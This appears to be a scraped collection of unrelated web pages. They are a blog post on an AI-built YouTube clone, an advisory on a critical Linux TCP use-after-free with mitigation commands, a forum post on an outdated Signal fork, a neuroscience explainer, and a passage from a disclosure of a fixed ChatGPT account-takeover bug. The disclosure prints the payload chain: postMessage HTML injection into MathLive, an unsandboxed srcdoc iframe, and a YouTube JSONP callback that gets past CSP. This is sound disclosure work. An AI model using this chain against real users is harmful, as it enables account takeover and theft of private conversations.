title: HackerTube: YouTube built from videos recommended by HN
body_text: HackerTube – karpathy karpathy Home Blog HackerTube 31 Oct, 2026 It was Friday night at 11pm, I was tired, I went to YouTube to watch something and realized that I was looking at an enshittified wall of slop. Insanely exaggerated thumbnails, dumb recommendations of the same tired topics, truly terrible idiocracy-grade content. I'm sure this algorithm works well for the median person on the internet, but it definitely does not work for me. So this morning (Saturday) I took a hold of my Opus 5.5 and gave it the task: Let's write our own YouTube clone based on whatever videos have been recommended on Hacker News. And Opus came back with: hackertube.org ! Opus downloaded all comments of HackerNews, filtered them down, ran Sonnet over them in a workflow, got rid of spam and low grade content, and narrowed them down to just 40K comments recommending a YouTube video. In total, we get 6,454 YouTube videos that have been recommended by a few people on HN from 2007-2026 across 150 topics. Then we wrap it up in a YouTube UI, get a domain, push to a VPS, secure, harden, optimize and voila! HackerTube: Contains quality content Uses the 50% thumbnail instead of the uploaded thumbnail Custom and good ForYou recommendations without any user accounts, storing state in local browser session Keyboard shortcuts Export of the site's data available to give to your agent to easily create your own version This takes ~2 hours now. I can breathe again. Thank you Opus 5.5   Powered by Bear ʕ•ᴥ•ʔ

All Services Client Portal Home / Meridian / Security / Linux's October 2026 TCP Use-After-Free: CVE-2026-98432 Security Disclosure Fixed upstream · Oct 15, 2026 Linux kernel · IPv4 TCP handshake CVE-2026- 98432 Severity · Critical Remote use-after-free · CVSS 9.8 Release line Fixed in Supported until 7.3 7.3 — 7.2 7.2.10 — 6.18 6.18.56 — 6.12 6.12.113 — 5.10 – 6.6 5.10.272 – 6.6.159 — 4.4 – 5.4 distro fixes only — fixed no fix atlas · disclosure · Linux kernel Security · Security Disclosure Linux's October 2026 TCP Use-After-Free: CVE-2026-98432 CVE-2026-98432 is a CVSS 9.8 remote use-after-free in Linux's IPv4 TCP handshake, fixed upstream Oct 15. Ubuntu and RHEL haven't shipped a fixed kernel yet. A Atlas Security Security Advisories · October 29, 2026 11:00 AM CDT · 15 min read · 3,284 words · Updated October 31, 2026, 5:15 PM CDT Updated October 31, 2026 Red Hat raised its rating to Critical on October 30 and published a mitigation, AlmaLinux has fixed kernels in testing, and Amazon Linux has fixed all of its kernels. The Go Security Team says Go programs open multipath TCP listeners by default, so the setup Anthropic's exploit needs is more common than it first looked. What changed . # Overview Linux's stable kernels shipped a fix on October 11 and 15, 2026 for CVE-2026-98432 , a use-after-free in the IPv4 TCP handshake that a remote, unauthenticated peer can reach. The kernel's own CVE Numbering Authority (CNA) scores it CVSS 3.1 9.8, Critical . The fixed releases are 5.10.272, 5.15.223, 6.1.190, 6.6.159, 6.12.113, 6.18.56, 7.2.10 , and 7.3 , and the bug goes back to Linux 4.4. The upstream fix is a four-line change, but most servers run a distribution's kernel, and as of 5:15 PM CDT, October 31, Ubuntu's tracker still reads "Vulnerable" for its kernel on every release, and Red Hat, which now rates the bug Critical too, lists RHEL 8, 9, and 10 as affected with no fix. CVE-2026-98432 · Linux kernel Critical · CVSS 9.8 Affected Linux from 4.4 on, below 5.10.272 / 5.15.223 / 6.1.190 / 6.6.159 / 6.12.113 / 6.18.56 / 7.2.10 . Distribution kernels follow their own versions: check the tracker. Fix Install your distribution's fixed kernel and reboot . Debian, current SUSE Enterprise, Oracle UEK, and Amazon Linux kernels have one; Ubuntu and RHEL don't yet. Can't patch yet Drop TCP packets that carry IPv4 options ( Atlas's interim rule ), turn off multipath TCP if you don't use it, and patch hosts with multipath TCP listeners first. Why it's urgent: the bug sits in code every Linux server runs when it accepts an IPv4 TCP connection, before any application sees the connection. Anthropic, whose researcher reported it, says its Claude model wrote a working proof-of-concept exploit that runs commands as root on "Linux servers with a multipath TCP listener," with no credentials. Go programs open those listeners by default, per the Go Security Team. See the timeline . # Key facts Field Detail CVE CVE-2026-98432, "ipv4: free inet_opt and ireq_opt after an RCU grace period," issued by the Linux kernel CNA Severity Critical, CVSS 3.1 9.8 ( AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H ), the kernel CNA's score. Red Hat also rates it Critical, CVSS 3.1 9.8, raised from Important (8.1) on October 30. SUSE rates it important, Ubuntu rates it High, and Oracle and Amazon rate it Important with CVSS 3.1 8.1. Weakness Use-after-free of IPv4 option data during the TCP handshake (the record lists no CWE) Impact Per the CNA's scoring notes: kernel heap contents disclosed to the remote peer, kernel memory corruption, or a crash. Red Hat's bulletin: a remote, unauthenticated attacker "could exploit a race condition during TCP connection request processing to trigger remote code execution." Fixed in 7.2.10 and 6.18.56 (Oct 11) · 6.12.113, 6.6.159, 6.1.190, 5.15.223, and 5.10.272 (Oct 15) · 7.3 (Oct 18) No fix yet Ubuntu (every release) and Red Hat Enterprise Linux (RHEL) 8, 9, and 10, as of 5:15 PM CDT, October 31. AlmaLinux's fixed kernels are still in testing. Upstream branches that reached end-of-life before 5.10 get no fix. Proof of concept Anthropic says Claude built a remote root exploit for servers with a multipath TCP listener. It hasn't published the exploit. CVE records Published on cve.org on October 15. NVD lists it as "Received," with no analysis of its own, as of 5:15 PM CDT, October 31. Credit Reported by Xinyang Ge of Anthropic. Fixed by Eric Dumazet and reviewed by Kuniyuki Iwashima, per the fix commit. # Who is affected Any Linux kernel from 4.4 on that lacks the fix, whether it serves the network directly or hosts containers: a container runs on the host's kernel, so a new image doesn't change anything. IPv6 connections aren't affected by the main issue; the commit says "IPv6 is not affected by the first issue." Release line Status on Oct 31, 2026 Fixed in Released 7.3 Mainline 7.3 (from 7.3-rc7) Oct 18, 2026 7.2 Stable 7.2.10 Oct 11, 2026 6.18 Longterm 6.18.56 Oct 11, 2026 6.12 Longterm 6.12.113 Oct 15, 2026 6.6 Longterm 6.6.159 Oct 15, 2026 6.1 Longterm 6.1.190 Oct 15, 2026 5.15 Longterm 5.15.223 Oct 15, 2026 5.10 Longterm 5.10.272 Oct 15, 2026 4.4 – 5.4 End-of-life upstream distro fixes only — # Distribution status Distribution kernels carry backported fixes under their own version numbers, so check the tracker, not the upstream number. As of 5:15 PM CDT, October 31: Ubuntu: the tracker lists the linux package as "Vulnerable" on every release. On 26.10, 26.04, 24.04, and 22.04 it adds "work in progress" in 7.3.0-10.10 , 7.0.0-43.43 , 6.8.0-149.149 , and 5.15.0-203.213 ; 20.04, 18.04, and 16.04 show only "Vulnerable." Many cloud and hardware-enablement kernels are listed the same way, and no Ubuntu Security Notice has been published. Red Hat: rated Critical, CVSS 3.1 9.8, since October 30. RHEL 8, 9, and 10 and OpenShift Container Platform 4 and 5 are listed as affected, with no fix; RHEL 6 and 7 aren't affected ( CVE page ). Its bulletin, RHSB-2026-016 , says "Red Hat is expediting the release of fixes," gives an nftables mitigation ( compared below ), and says any product that relies on the RHEL kernel, including RHEL CoreOS, "is also potentially impacted." AlmaLinux: fixed kernels for AlmaLinux 8, 9, and 10 ( kernel-4.18.0-553.180.2.el8_10 , kernel-5.14.0-687.61.2.el9_8 , and kernel-6.12.0-211.69.2.el10_2 ) have been in its testing repository since October 30, ahead of RHEL. AlmaLinux will move them to production after community testing, and its errata don't list them yet ( announcement ). Debian: fixed in 12 "bookworm" ( 6.1.190-1 , DLA-4841-1, and linux-6.12 6.12.113-1~deb12u1 , DLA-4850-1), 13 "trixie" ( 6.12.113-1 , DSA-6568-1), and unstable ( tracker ). SUSE: rated important. SUSE Linux Enterprise Server 16.0 ( kernel-default 6.12.0-160000.40.1 ) and the 15 SP4, SP5, and SP6 LTSS kernels are fixed; 15 SP7 is in progress. openSUSE Leap 16.0 is fixed, and Leap 15.6 is listed as affected ( CVE page ). Oracle Linux: rated Important, CVSS 3.1 8.1. Unbreakable Enterprise Kernel (UEK) errata for Oracle Linux 7, 8, 9, and 10 came out October 16: ELSA-2026-500397, ELSA-2026-500398, and ELSA-2026-500399 ( CVE page ). The page lists only the UEK kernels. Amazon Linux: rated Important, CVSS 3.1 8.1, and every kernel is fixed. On Amazon Linux 2023, the default kernel (ALAS2023-2026-3365, October 30), kernel6.12 (ALAS2023-2026-3335, October 29), and kernel6.18 (ALAS2023-2026-3251, October 24). On Amazon Linux 2, the core kernel (ALAS2-2026-4065) and the 5.4, 5.10, and 5.15 Extras kernels (ALAS2KERNEL-5.4-2026-135, ALAS2KERNEL-5.10-2026-137, and ALAS2KERNEL-5.15-2026-120), all October 30 ( CVE page ). # How the vulnerability works When a Linux server accepts a TCP connection, the kernel tracks the half-open handshake in a lightweight "request socket," then creates a full socket once the handshake completes. If the connecting peer's IPv4 header carried options, the kernel keeps them to echo in its replies. The bug: the kernel handed those saved options from the request socket to the new connection without copying them, then freed them immediately when the connection went away, while another CPU could still be reading them to build a handshake reply. Reading freed kernel memory is a use-after-free. The peer needs no login, and it all happens inside the kernel's handshake handling, before any application code runs. The CNA's scoring notes say the stale data can leak kernel heap memory back to the peer, steer kernel writes out of bounds, or crash the machine. Anthropic says a lost race "only fails the handshake without crashing the whole system, so a determined attacker can retry indefinitely until they succeed." # The fix Eric Dumazet's commit, "ipv4: free inet_opt and ireq_opt after an RCU grace period," changes two plain kfree() calls to kfree_rcu() , which waits until every reader has finished with the memory before freeing it. Other code paths that replace these options already did that. The commit also fixes the same problem in request-socket migration ( net.ipv4.tcp_migrate_req=1 , or a BPF_SK_REUSEPORT_SELECT_OR_MIGRATE program), and says a related IPv6 case "will be addressed in a separate patch." ipv4: free inet_opt and ireq_opt after an RCU grace period torvalds/linux · e3f33b0 · Oct 1, 2026 net/ipv4/af_inet.c + 1 − 1 1 lines added, 1 removed net/ipv4/tcp_ipv4.c + 1 − 1 1 lines added, 1 removed 2 files changed + 2 − 2 2 lines added, 2 removed # Which servers are exposed Every Linux host that accepts IPv4 TCP connections on an affected kernel: web servers, SSH, databases, load balancers, and Kubernetes nodes. The CNA's notes say the vulnerable path runs "during the TCP handshake, before application authentication." Hosts with a multipath TCP (MPTCP) listener first. That's the setup Anthropic's working exploit needs: "Linux servers with a multipath TCP listener." Anthropic hasn't said why that listener matters, and the CVE record doesn't mention MPTCP. A server has one only if an application opens an MPTCP socket, and Go programs do by default: the Go Security Team says "as of Go 1.24, Go programs enable MPTCP by default for listen sockets on Linux." The default follows the go line in the program's go.mod , and applies only where the kernel allows MPTCP ( net.mptcp.enabled = 1 , as on the Debian 12 kernel we checked; AlmaLinux says it ships MPTCP off). The Go team adds that "the underlying bug is not specific to MPTCP. It is possible that systems with no MPTCP listeners are vulnerable to similar attacks." The check is below . Red Hat now rates it as the CNA does. It raised the bug from Important (8.1) to Critical (9.8) on October 30, citing "the lack of network prerequisites and the potential for severe system instability." Its bulletin says "Systems accepting inbound TCP connections are most directly exposed." # How to check your systems # Check the kernel Shell Copy 1 uname - r # the running kernel 2 uname - v # Debian: the package version running 3 dpkg - l 'linux-image*' | grep ^ ii # Debian/Ubuntu: installed kernel packages 4 rpm - q kernel # RHEL and derivatives: installed kernels 5 needs-restarting - r # RHEL (dnf-utils): is a reboot needed? Compare the result with your distribution's status above , not with the upstream version. If the installed kernel is newer than the running one, the fix isn't active until you reboot. Run these on container hosts and Kubernetes nodes, not inside containers: a container reports the host's kernel. We ran them on a Debian 12 host and in a Rocky Linux 9 container. # Check for multipath TCP listeners Shell Copy 1 ss - Mlnp # MPTCP listening sockets and the processes that own them 2 sysctl net . mptcp . enabled # 1 means applications may open MPTCP sockets ss -M lists only MPTCP sockets, so an empty result means no MPTCP listener. net.mptcp.enabled = 1 alone doesn't create one: an application has to open an MPTCP socket. We tested both with iproute2 6.1 in a Debian 12 container, where ss -Mlnp listed a test MPTCP listener and skipped a plain TCP one beside it. On October 31 it also listed a Go HTTP server whose go.mod says go 1.24 , and skipped the same server built with go 1.23 . # How to fix # Update the kernel and reboot Install your distribution's fixed kernel as soon as it ships, then reboot: a kernel update doesn't take effect until the machine boots into it. Reboot container hosts and Kubernetes nodes too. Appliances and cloud images that bundle a kernel need their vendor's update. On Debian, SUSE Linux Enterprise Server 16.0 and the 15 LTSS releases, openSUSE Leap 16.0, Oracle Linux's UEK kernels, and Amazon Linux 2 and 2023, the fix is out. AlmaLinux's is in its testing repository. On Ubuntu and RHEL, it isn't out yet, as of 5:15 PM CDT, October 31. Watch the trackers linked above . Running a self-built kernel? Move to the fixed stable release for its line. # If you can't patch yet Red Hat's bulletin and AlmaLinux now publish nftables rules that drop incoming IPv4 TCP packets carrying IP options. Red Hat says its rule "reduces exposure to this vulnerability but cannot fully prevent it." The following is Atlas's interim recommendation, the same rule as AlmaLinux's, based on the CNA's scoring notes, which say the attacking peer supplies IPv4 Record Route or Timestamp options in its SYN. TCP traffic almost never carries IPv4 options legitimately, so dropping TCP packets that have them should cost nothing: Shell Copy 1 nft add table ip cve_2026_98432 2 nft add chain ip cve_2026_98432 pre '{ type filter hook prerouting priority -300; }' 3 nft add rule ip cve_2026_98432 pre meta l4proto tcp ip hdrlength gt 5 counter drop ip hdrlength gt 5 matches any IPv4 header longer than the 20-byte minimum, which only options produce. The rule runs before connection tracking and doesn't touch IPv6 or non-TCP traffic. We tested it in a Debian 12 container: it dropped a SYN carrying a Record Route option, and ordinary TCP connections still worked. We haven't tested it against an exploit, and it doesn't fix the kernel. It lasts until reboot, which is fine if the reboot is into a fixed kernel; remove it with nft delete table ip cve_2026_98432 . If your edge firewall can drop IPv4 packets with options, doing it there protects every host behind it. If you manage the firewall with iptables, this rule does the same job from the raw table, which also runs before connection tracking: Shell Copy 1 iptables - t raw - I PREROUTING - p tcp - m u32 - - u32 "0>>24&0xF=6:15" - j DROP The u32 match reads the IPv4 header-length field, and a value of 6 to 15 means the header carries options. We tested it with iptables 1.8.9, on both its nf_tables and legacy backends, in a Debian 12 container: it dropped a Record Route SYN sent to the host and one routed through it, and ordinary TCP connections still worked. Remove it by running the same command with -D in place of -I ; like the nft rule, it lasts until reboot. It needs the kernel's xt_u32 module, which the Debian 12, Ubuntu 22.04 and 24.04, and RHEL 8 kernels include. RHEL 9 and 10 kernels, and their rebuilds, leave it out, so use the nft rule there. Red Hat's rule hooks input ; ours hooks prerouting , so it also drops packets the host routes on to containers. On October 31 we tested it against two pairs of network namespaces. It dropped a Record Route SYN routed between one pair, and never saw one bridged between the other, as AlmaLinux warns: "Traffic between containers on the same host may bypass it." AlmaLinux also says not to use it on networks that rely on CIPSO security labels, which travel in IPv4 options. Turn off multipath TCP if you don't use it. That removes the setup Anthropic's exploit needs, though not the bug. AlmaLinux's steps: Shell Copy 1 echo 'net.mptcp.enabled = 0' | sudo tee / etc / sysctl . d / 9 0 - disable-mptcp . conf 2 sudo sysctl - w net . mptcp . enabled = 0 3 sudo ss - Mlnp # listeners opened earlier stay MPTCP: restart their services New MPTCP sockets then fail, and Go programs fall back to plain TCP when they start. The setting is per network namespace, and each new one starts with MPTCP on, so a container keeps it unless you set it there too (Docker: --sysctl net.mptcp.enabled=0 ). We tested the steps and the Docker flag on October 31. For a single Go program, GODEBUG=multipathtcp=0 in its environment turns the default off, but the Go Security Team calls disabling MPTCP program by program "a fragile mitigation." Until you can patch, keep MPTCP listeners off the internet, and put the hosts that have one at the top of the patch list. # Timeline and exploitation status All times are CDT (UTC−5). When What Oct 1 · 5:12 PM Eric Dumazet posts the fix, crediting Xinyang Ge of Anthropic as reporter Oct 5 The fix is merged into the kernel's networking tree Oct 11 Linux 7.2.10 and 6.18.56 ship the fix; 7.3-rc7 follows that night Oct 15 · 4:56–7:16 AM Linux 6.12.113, 6.6.159, 6.1.190, 5.15.223, and 5.10.272 ship the fix; the CVE record is published at 7:08 AM Oct 16 Oracle publishes UEK errata with the fix for Oracle Linux 7 through 10 Oct 18 Linux 7.3 is released with the fix Oct 24 Amazon Linux 2023's kernel6.18 package is fixed Oct 27 Anthropic's Frontier Red Team describes a remote root exploit for the bug, built by Claude in its lab Oct 29 · 6:34 PM The Go Security Team says Go programs have opened MPTCP listeners by default since Go 1.24 Oct 29 Ubuntu still lists its kernels as vulnerable; Amazon Linux 2023's kernel6.12 package is fixed; GitHub repositories referencing the CVE appear, one created at 7:22 PM describing a race trigger Oct 30 AlmaLinux puts fixed kernels in its testing repository; Red Hat raises its rating to Critical and publishes bulletin RHSB-2026-016 with a mitigation; Amazon Linux fixes its remaining kernels Oct 31 36 GitHub repositories reference the CVE, at least six describing a race trigger or a proof of concept Exploitation status. Anthropic says Claude wrote the exploit "after initial prompting," that it runs "arbitrary commands as root, without any credentials or user interaction" on servers with a multipath TCP listener, and that in its proof of concept "it takes 48 minutes to leak a kernel pointer and another five minutes to reach the shell command execution." Anthropic hasn't published the exploit. Its disclosure policy gives developers 90 days to patch and a further 45 days before Anthropic discusses details beyond a public advisory. Red Hat's bulletin now says the bug could be exploited "to trigger remote code execution." By 5:15 PM CDT on October 31, 36 GitHub repositories referenced the CVE. Most describe themselves as audit or mitigation tooling, among them Ansible roles and a livepatch for AlmaLinux and Rocky Linux. At least six say they include a race trigger or a proof of concept for the use-after-free; the first was created at 7:22 PM on October 29, and the latest at 11:04 AM on October 31. The CVE isn't in CISA's Known Exploited Vulnerabilities catalog as of 5:15 PM CDT. We haven't tested any public proof of concept, and we aren't linking them. # Updates to this post We'll revise this post and mark it updated when any of these change: fixed kernels from Ubuntu or Red Hat, or AlmaLinux's production release; NVD's analysis; a KEV listing or any report of exploitation; the separate IPv6 fix. October 31, 5:15 PM CDT: Red Hat raised its rating from Important (8.1) to Critical (9.8) on October 30 and published a mitigation in bulletin RHSB-2026-016, so we replaced its earlier rating and its "no mitigation" statement. Added the Go Security Team's notice that Go programs open MPTCP listeners by default, AlmaLinux's fixed kernels in testing, Amazon Linux's fixes for its remaining kernels, openSUSE Leap 16.0's fix, steps to turn off MPTCP, an iptables version of the interim rule, and the interim rule's limits with bridged container traffic and CIPSO. 36 GitHub repositories now reference the CVE. Ubuntu, Debian, Oracle, NVD's status, and KEV are unchanged, and the stable kernels released October 30 don't include the IPv6 follow-up. October 29, 8:00 PM CDT: Added Oracle Linux, fixed in its UEK kernels since October 16, and Amazon Linux, fixed in Amazon Linux 2023's 6.12 and 6.18 kernels and pending elsewhere. Eight GitHub repositories now reference the CVE, one describing a race trigger. Ubuntu, Red Hat, Debian, SUSE, NVD, and KEV are unchanged since 11:00 AM, and nothing was corrected. # Get help If the hard part is knowing which hosts, nodes, and appliances run which kernel, and which of them can reboot this week, our advisors can help plan it. The bug is reachable through any listening TCP port, so it helps to know which ones the internet can see. It's the second Linux kernel fix this month that only takes effect after a reboot. title: Molly (Signal fork) has not been updated since 3 months and is vulnerable
body_text: YSK Molly(Signal fork) has not been updated since 3 months and is vulnerable to attacks fixed in mainline Signal Skip to main content Go to side pane PieFed.World Communities Explore Donate Log in Register Home Communities You Should Know@lemmy.world YSK Molly(Signal fork) has not been updated since 3 months and is vulnerable to attacks fixed in mainline Signal submitted 17 hours ago by beep edited 17 hours ago cross-posted from: https://piefed.world/c/ysk/p/1503393/ysk-molly-signal-fork-has-not-been-updated-since-3-months-and-is-vulnerable-to-attacks-f As of now, Molly lastest release was in 31 July (Version v8.19.2-4). It contains vulnerabilities that had been simply fixed in mainline Signal. Take for example the latest exploit disclosed in October , it has been fixed in Signal 8.27. 1 . Meanwhile Molly remains vulnerable. It’s currently recommended to use mainline Signal and delete Molly till they at least return to updating their app adequately, if they ever will. 44 160 Share on Mastodon Share on Reddit Share on Facebook Share on WhatsApp Log in to comment 44 Comments Hot Top New Old by Alex @lemmy.ml 17 hours ago depth: 1 Why run Molly when Signal is right there? Is this about getting it via places other than the Play store?  reply 16 by dracs @programming.dev 14 hours ago depth: 2 I’m running it specifically for the UnifiedPush support which gives me push notifications without Google Play Services.  reply 7 by pulsewidth @lemmy.world 12 hours ago depth: 3 Signal works perfectly with MicroG for reference. I have no Google Play Services on my GrapheneOS phone, or any Google account. title: Serbia just elected the world's brainiest parliament
Simple circuits can create complex behaviors
body_text: Let’s Build a Brain Myriad Let’s Build a Brain By Aatish Bhatia and Arkarup Banerjee The world is full of surprising behavior: Beavers building dams, songbirds singing, spiders building webs, and you reading this article. All of these behaviors are orchestrated by neurons firing in the brain. But how exactly do collections of neurons create these complex behaviors? This is a huge question that researchers are still working on. But over the last half century, neuroscientists have solved some pieces of this puzzle. In this article, we’ll build a tiny creature called a spark, and we’ll give it a very simple brain. As you’ll see, even this tiny brain can create rich and unexpected behaviors. Light eaters Suppose this spark feeds on light. Its goal in life is to reach the light. The light-hungry spark needs a way to sense the world. So we’ll give it a rudimentary eye — a single neuron that detects brightness and converts it into electrical pulses. It also needs a way to move. So we’ll give it another neuron that can wiggle a flipper. By wiring the first sensory neuron to the second motor neuron , we’ve just assembled our first neural circuit: The anatomy of a spark With this simple circuit, the spark wiggles its flipper in proportion to the amount of light. Can it find the light? If the sparks happen to face the light, they’re drawn towards it. But most of the time, they miss. Over time, their paths look like this: Only a few paths cross the light. Clearly, we can do a lot better… Adding an eye Here’s the problem: While the spark can speed up, it can’t steer. With one eye and one flipper, it only moves in one direction. But we need it to turn. What if we give it another eye and flipper? With two eyes, the spark can now sense whether the light is to its left or right. Now, it moves like this: Hmm… that didn’t work. Instead of steering towards the light, it steered away from it! If you didn’t know how their brains work, you might think that they fear light. Why do they avoid the light? Well, if the light were to the spark’s left, then its left eye would sense more brightness, which means that its left flipper would wiggle faster, and this would cause it to turn right, away from the light. Conversely, if the light were to its right, then it would veer left. A crossed connection But there’s a clever way to make this spark steer towards the light instead. All we have to do is cross its connections. That is, we wire its left eye to its right flipper, and its right eye to its left flipper. Now, it moves like this: With this simple wiring change, it can finally steer towards the light. But if you watch these sparks for a while, you’ll notice that there’s a problem. While they can reach the light, they don’t slow down near it. Instead, they charge towards it like comets plunging towards the sun. If you didn’t know how their brains work, now you might think that they’re attacking the light. Becoming inhibited Why do they attack the light? The problem lies in the type of connection that we used. To see why, we need to go back to our original spark. Remember how its flipper moved faster when the light got brighter? That’s because its eye and flipper were connected with an excitatory connection — where more input leads to more output. If the light were a food source, then this spark would accelerate towards it, but it wouldn’t stop to enjoy its lunch. Instead, we want the spark to slow down as it approaches the light. That is, we want its motion to be inhibited by light. We can solve this by swapping out the excitatory connection for an inhibitory connection — one where more input leads to less output. With the original excitatory connection, the spark overshoots the light. With the inhibitory one, it slows down and gently comes to a stop. Finding the light Now let’s bring back the original two-eyed spark, but this time with inhibitory connections between its eyes and flippers. Now, the flipper closer to the light moves slower, while the flipper on the opposite side moves faster, and this makes the spark turn towards the light. Click to move the light around. Drag the light to move it around. Hooray! It can finally steer to the light and come to a stop. You can move the light in the graphic above (or the one below) to watch the sparks react. Click to move the light around. Drag the light to move it around. They move as if they’re magnetically attracted to the light. If you didn’t know how their brains work, now you might think that they love light. We’ve now seen four very different behaviors, each achieved by making small changes to the neural circuitry of our virtual creatures. Attraction Fear Aggression Love Note: We’ve added a small amount of noise to the simulation to make the paths look more organic. If you saw creatures behaving like this in the wild, you might attribute some rudimentary intelligence to them. But we’ve just shown you how this apparent intelligence arises from the bottom up, with just four neurons and two connections. There’s no magic here. In this view, behavior emerges from neural circuits. And if a brain with just four neurons can do all this, imagine what your brain can achieve with nearly 100 billion neurons. Adding variation We can take this one step further. In each of the simulations so far, the sparks all had identical brains. But biology is full of variation: No two brains are the same. If we allow the connections between neurons to vary in strength, then each spark can react differently to the light. They now have different preferences: The yellower sparks seem to love light more, while the redder sparks keep a cautious distance. Click to move the light around. Drag the light to move it around. Just as a thermostat sets a preferred temperature, their brain wiring now determines their preference for light. If you squint very hard at this, you might be able to see the rudiments of how our brains encode preferences, such as a love for spicy food or an aversion to smelly cheese. Of course, biology is far more complex than these simplified sparks. We intentionally gave them very simple brains, so that we can understand how every part works. Their brains are also frozen in time. In reality, brains can learn: They alter their wiring to gain new skills such as learning to walk, ride a bicycle, or play a piano. In the next article, we’ll watch this learning process in action, and see how these sparks rewire their brains to find the light. Share this article Link copied! Learn more Thanks for reading Myriad , a blog by Aatish Bhatia and Arkarup Banerjee exploring how minds emerge from matter. Arka is an associate professor of neuroscience at Cold Spring Harbor Laboratory in New York. Check out his lab’s research on how a singing mouse in the cloud forests of Costa Rica got its song . Aatish is a science journalist with a Ph.D. in physics. Previously, he was a graphics editor at The New York Times. Follow Aatish’s work for more visually-immersive interactive explanations about science. The sparks that we assembled in this article are based on a series of thought experiments by the neuroscientist Valentino Braitenberg described in his delightfully quirky 1984 book Vehicles: Experiments in Synthetic Psychology . While the one-eyed sparks may look peculiar, it’s possible that you and I descended from a one-eyed cyclops-like creature that lived 560 million years ago. If you enjoyed reading this, consider sharing it with a friend. Share this article Link copied!

title: Do the math: How we took over ChatGPT accounts
body_text: Do the Math: How We Took Over ChatGPT Accounts - Parameter Labs Close Do the Math: How We Took Over ChatGPT Accounts By bypassing ChatGPT's sandbox and content security policy, our research team was able to take over anyone's account simply by sending them a link. Mukul Goyal Oct 28, 2026 12 mins October 26, 2026 Fixed P1 Severity In October 2026, we found a way to turn an ordinary public ChatGPT share into attacker-controlled JavaScript running inside the signed-in session of whoever opened it. An attacker could create a malicious conversation, publish it using ChatGPT's normal sharing feature, and send the link to another user. When the victim opened the share, the payload executed as chatgpt.com with access to the victim's authenticated web session. We confirmed that this code could enumerate the victim's conversation list, retrieve content from a private conversation that had never been shared with the attacker, and send data from that conversation to an external server. The payload was not limited to modifying the page or displaying an alert—it could directly call ChatGPT's authenticated APIs as the victim, essentially allowing us to take over the victim's ChatGPT account. The victim did not need to install an App, join a Project, paste code, or open developer tools. Opening the shared link was the only required action. OpenAI fixed the issue on October 26 and classified the report as P1. The chain started with two features that looked harmless on their own: a graph and an HTML Preview. flowchart TD A["Attacker publishes a ChatGPT conversation"] --> B["Victim opens the public share"] B --> C["HTML Preview crosses into the main chatgpt.com page"] C --> D["JavaScript runs in the victim's signed-in session"] D --> E["Any action on chatgpt.com as the victim:<br/>read private chats and files, change the account"] Technical walkthrough It started with a graph and a Preview The question that started this research was simple: if Preview code was boxed into a different website, what could it still talk to? ChatGPT can turn an HTML code block into a small working webpage using its Preview feature. Since that page may contain arbitrary code, ChatGPT sensibly runs it inside a restricted frame on a different web address. The Preview can run JavaScript, but the browser treats it as a different website, so it cannot directly inspect the signed-in ChatGPT page around it. At first, this isolation appeared to work exactly as intended. Code inside the Preview could not read parent.document , which is the main ChatGPT page. That should have been the end of it. The conversation also contained a normal interactive graph. Behind the scenes, the graph loaded a math library called MathLive. Loading it did more than draw the graph: it also installed a listener in the main ChatGPT page for messages related to MathLive's on-screen keyboard. Browsers call the relevant API postMessage . It is a legitimate way for two frames to exchange information even when the browser prevents them from reading each other's pages. You can think of it as a mail slot: the restricted Preview cannot walk into the main page, but it can still drop a message through the slot. That is safe only if the receiver checks who sent the message. MathLive did not make that check for the setting we were interested in. Its listener accepted a message that changed the virtual keyboard layout, and that layout was allowed to contain HTML. The graph had installed the receiver; the Preview gave us an untrusted sender. Two unrelated features had accidentally created a path across the sandbox. The message that should not have worked The Preview sent two messages. The first replaced a virtual keyboard layout with our HTML. The second told MathLive to show the keyboard, causing it to render the new layout: top.postMessage({ type: "mathlive#virtual-keyboard-message", action: "update-setting", layouts: [{ label: "Compatibility", layers: [{ id: "compatibility", markup }] }] }, "*"); top.postMessage({ type: "mathlive#virtual-keyboard-message", action: "show", animate: false }, "*"); parameter MathLive recognized the public message type, but its top-level controller used an origin policy of none , which meant it accepted messages from any web address. It also did not require the update-setting message to come from a previously approved window. Anyone who could reach the listener and knew the message format could replace the layout. When the keyboard opened, MathLive joined the supplied layout into an HTML string and assigned it to innerHTML in the real ChatGPT page. A helper named createHTML initially looked like it might sanitize the value. It did not; it marked the string as trusted and passed our HTML through unchanged. This was exciting, but we still did not have JavaScript execution. Script tags inserted through innerHTML do not automatically run. The next step was an iframe using srcdoc , a browser feature that lets an embedded frame carry its HTML directly in an attribute: <iframe srcdoc="..."></iframe> parameter MathLive inserted this frame into the main ChatGPT document without a sandbox attribute. That gave us two useful properties. First, srcdoc created a fresh document where an external script could execute. Second, because the main ChatGPT page created the frame, the browser gave it the https://chatgpt.com web identity. Code inside the new frame could therefore access the parent page. Bypassing CSP with YouTube JSONP ChatGPT's Content Security Policy, or CSP, stopped us again. CSP controls which scripts a page may load, and the policy correctly blocked inline JavaScript. It did, however, allow scripts from YouTube. YouTube's oEmbed endpoint supported a JSONP-style callback parameter. JSONP responses are JavaScript rather than ordinary JSON. The endpoint tried to reject an invalid callback, but it placed the callback into the response before returning its validation error: https://www.youtube.com/oembed?callback=globalThis.__marker=31337;void parameter The response began like this: // API callback globalThis.__marker=31337;void({ "error": { "code": 400, "message": "Invalid JSONP callback name: ..." } }); parameter Ending our callback with ;void made the object appended by YouTube harmless. Since YouTube was already allowed by ChatGPT's CSP, the browser loaded this response as a script and ran our callback inside the new frame. We now had arbitrary JavaScript running as chatgpt.com. The original Preview was still isolated on its separate web address; we had crossed the boundary by convincing a trusted component in the main page to create a new, unsandboxed document for us. Turning a lab bug into one public link So far, this was a useful sandbox escape, but the first working version was not a convincing real-world attack. It used a researcher-controlled ChatGPT App as the sender. A victim would have needed to connect or invoke that App first. We next tried delivering the payload through a native HTML attachment. ChatGPT opened the attachment inside the same sandboxed Preview, so it could send the malicious MathLive messages. However, when we exported the conversation as a public share, the attachment remained but the earlier graph did not. The graph was essential because it loaded MathLive and installed the vulnerable message listener in the main page. Without it, the attachment could still send the messages, but nothing was listening to or processing them. The breakthrough was putting both pieces directly into one ordinary public conversation: A genuine graph initialized MathLive in the main page. A later assistant-authored HTML Preview sent the two messages. The resulting /share/<id> link preserved the complete chain for another user. The attacker could deliver it the same way they would send any shared ChatGPT conversation—through email, chat, a support ticket, or a social post. The victim did not need to install anything, join the attacker's workspace, or authenticate through an attacker-controlled flow. They just had to visit the attacker's shared ChatGPT URL. We observed two versions of the interaction. In the most stable reproduction, the victim opened the share and clicked ChatGPT's normal Preview button once. We later marked the HTML block as previewable so that ChatGPT opened it automatically. In that version, opening the link was the victim's only click. We reproduced 